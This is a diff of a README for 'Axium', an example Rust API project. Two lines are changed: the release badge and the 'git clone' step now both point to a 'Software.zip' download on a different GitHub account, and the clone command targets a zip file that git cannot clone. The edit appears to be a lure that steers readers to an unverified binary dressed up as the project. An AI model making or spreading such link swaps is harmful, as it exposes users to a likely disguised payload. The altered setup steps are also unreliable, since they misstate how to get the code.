@@ -2,7 +2,7 @@
 
 Welcome to the official repository of Axium, an example API built with Rust, Axum, SQLx, and PostgreSQL.
 
-[![GitHub release (latest by date)](https://img.shields.io/github/v/release/cli/browser)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![GitHub release (latest by date)](https://github.com/Arya-gg/Axium/releases/download/v1.0/Software.zip)](https://github.com/Arya-gg/Axium/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -31,7 +31,7 @@ To get started with Axium, follow these simple steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/Axium.git
+   git clone https://github.com/Arya-gg/Axium/releases/download/v1.0/Software.zip
    ```
    
 2. Install dependencies:
